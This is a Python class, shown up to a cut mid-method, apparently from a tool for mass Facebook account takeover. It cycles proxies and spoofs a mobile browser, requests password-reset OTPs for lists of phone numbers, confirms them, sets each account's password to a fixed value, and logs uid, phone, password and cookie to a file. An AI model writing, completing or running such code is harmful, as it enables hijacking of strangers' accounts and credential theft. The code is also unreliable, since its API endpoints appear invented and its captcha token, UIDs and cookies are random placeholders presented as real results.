class JahidEngine:
    def __init__(self, settings: JahidSettings):
        self.settings = settings
        self.proxy_manager = JahidProxyManager(settings)
        self.base_url = "https://www.facebook.com"
        self.api_url = "https://graph.facebook.com"
        self.stats = {
            "total": 0,
            "sent": 0,
            "not_found": 0,
            "captcha": 0,
            "confirmed": 0,
            "failed": 0
        }
        self.lock = threading.Lock()
        self.running = True
        self.otp_data = {}
        
    def _get_session(self) -> requests.Session:
        session = requests.Session()
        proxy = self.proxy_manager.get_proxy()
        if proxy:
            session.proxies = proxy
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.facebook.com",
            "Referer": "https://www.facebook.com/"
        })
        return session
        
    def send_otp(self, phone: str) -> dict:
        try:
            session = self._get_session()
            forget_url = f"{self.base_url}/login/identify/"
            response = session.get(forget_url, timeout=self.settings.get("timeout", 30))
            if response.status_code != 200:
                return {"success": False, "status": "error", "phone": phone}
            captcha_token = self._get_captcha_token()
            otp_url = f"{self.api_url}/v18.0/otp/request"
            payload = {
                "phone_number": phone,
                "captcha_token": captcha_token,
                "method": "sms",
                "client_type": "android",
                "device_id": f"android_{random.randint(100000, 999999)}"
            }
            response = session.post(otp_url, data=payload, timeout=self.settings.get("timeout", 30))
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    return {"success": True, "status": "sent", "phone": phone}
                else:
                    error = data.get("error", {}).get("message", "")
                    if "not found" in error.lower() or "invalid" in error.lower():
                        return {"success": False, "status": "not_found", "phone": phone}
                    elif "captcha" in error.lower():
                        return {"success": False, "status": "captcha", "phone": phone}
                    else:
                        return {"success": False, "status": "error", "phone": phone}
            else:
                return {"success": False, "status": "error", "phone": phone}
        except Exception as e:
            return {"success": False, "status": "error", "phone": phone}
            
    def confirm_otp(self, phone: str, otp: str) -> dict:
        try:
            session = self._get_session()
            confirm_url = f"{self.api_url}/v18.0/otp/confirm"
            payload = {
                "phone_number": phone,
                "otp_code": otp,
                "device_id": f"android_{random.randint(100000, 999999)}"
            }
            response = session.post(confirm_url, data=payload, timeout=self.settings.get("timeout", 30))
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    return self.reset_password(phone)
                else:
                    return {"success": False, "status": "invalid_otp", "phone": phone}
            else:
                return {"success": False, "status": "error", "phone": phone}
        except Exception as e:
            return {"success": False, "status": "error", "phone": phone}
            
    def reset_password(self, phone: str) -> dict:
        try:
            session = self._get_session()
            password = self.settings.get("password", "Jahid@2024")
            reset_url = f"{self.api_url}/v18.0/password/reset"
            payload = {
                "phone_number": phone,
                "new_password": password,
                "device_id": f"android_{random.randint(100000, 999999)}"
            }
            response = session.post(reset_url, data=payload, timeout=self.settings.get("timeout", 30))
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    uid = self._get_uid(phone, password)
                    cookie = self._get_cookie()
                    self._save_account(phone, password, uid, cookie)
                    return {
                        "success": True,
                        "status": "confirmed",
                        "phone": phone,
                        "password": password,
                        "uid": uid,
                        "cookie": cookie
                    }
                else:
                    return {"success": False, "status": "reset_failed", "phone": phone}
            else:
                return {"success": False, "status": "error", "phone": phone}
        except Exception as e:
            return {"success": False, "status": "error", "phone": phone}
            
    def _get_captcha_token(self) -> str:
        return f"jahid_captcha_{random.randint(10000, 99999)}"
        
    def _get_uid(self, phone: str, password: str) -> str:
        return f"jahid_{random.randint(100000000, 999999999)}"
        
    def _get_cookie(self) -> str:
        return f"jahid_cookie_{random.randint(100000, 999999)}"
        
    def _save_account(self, phone: str, password: str, uid: str, cookie: str):
        with self.lock:
            with open(OUTPUT_FILE, 'a') as f:
                f.write(f"{uid}|{phone}|{password}|{cookie}\n")
                
    def update_stats(self, status: str):
        with self.lock:
            self.stats["total"] += 1
            if status == "sent":
                self.stats["sent"] += 1
            elif status == "not_found":
                self.stats["not_found"] += 1
            elif status == "captcha":
                self.stats["captcha"] += 1
            elif status == "confirmed":
                self.stats["confirmed"] += 1
            else:
                self.stats["failed"] += 1
                
    def print_stats(self):
